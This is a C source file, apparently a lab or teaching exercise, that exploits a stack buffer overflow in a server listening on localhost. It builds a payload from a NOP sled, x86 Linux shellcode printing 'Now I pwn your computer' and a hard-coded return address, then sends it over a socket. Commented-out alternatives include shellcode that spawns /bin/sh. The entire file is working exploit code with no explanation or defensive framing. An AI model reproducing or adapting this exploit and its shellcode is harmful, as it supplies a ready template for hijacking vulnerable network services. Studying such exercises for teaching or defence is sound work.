#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
int main(int argc, char *argv[])
{
 int sockfd;
 int len;
 struct sockaddr_in address;
 int result;
 char ch = 'A';
 char rec[1024];


sockfd = socket(AF_INET, SOCK_STREAM, 0);
 address.sin_family = AF_INET;
 address.sin_addr.s_addr = inet_addr("127.0.0.1");
 address.sin_port = htons(atoi(argv[1]));
 len = sizeof(address);
 result = connect(sockfd, (struct sockaddr *)&address, len);

 if (result == -1)
 {
  perror("oops: client1");
 printf("fail");
  exit(1);
 }
char shellcode[]=
"\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x18"
"\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x4e\x6f"
"\x77\x20\x49\x20\x70\x77\x6e\x20\x79\x6f\x75\x72\x20\x63\x6f\x6d\x70"
"\x75\x74\x65\x72\x20";

/*"\xe9\x2b\x00\x00\x00\x5e\x89\xf2\x83\xec\x0c\x89\x14\x24\x83\xc2"
"\x09\x83\xc2\x01\x89\x54\x24\x04\xc7\x44\x24\x08\x00\x00\x00\x00"
"\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x0c\x24\x8d\x54\x24\x08\xcd\x80"
"\xe8\xd0\xff\xff\xff"
"\x2f\x62\x69\x6e\x2f\x65\x63\x68\x6f\x00"
"\x4e\x6f\x77\x20\x49\x20\x70\x77\x6e\x20\x79\x6f\x75\x72\x20\x63"

"\x6f\x6d\x70\x75\x74\x65\x72\x00";*/

/*"\x31\xc0\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
"\x69\x89\xe3\x89\xc1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";*/
char return_addr[] ="\x2c\xd4\xff\xff";
//char return_addr[]="aaaa";

char mess[1061];
memset(mess,0x00,1061);
int i,j;


for (i=0; i< 900; i++) mess[i]= 0x90;

for (j=0; j< strlen(shellcode); j++) mess[i++]= shellcode[j];

for (j=0; j<100;j++) mess[i++]= 0x90;





for (j=0; j< strlen(return_addr);j++) mess[i++]= return_addr[j];

mess[i++]= '\n';
printf("message: %s",mess);























send(sockfd,mess,1061,0);




 close(sockfd);
 exit(0);
}


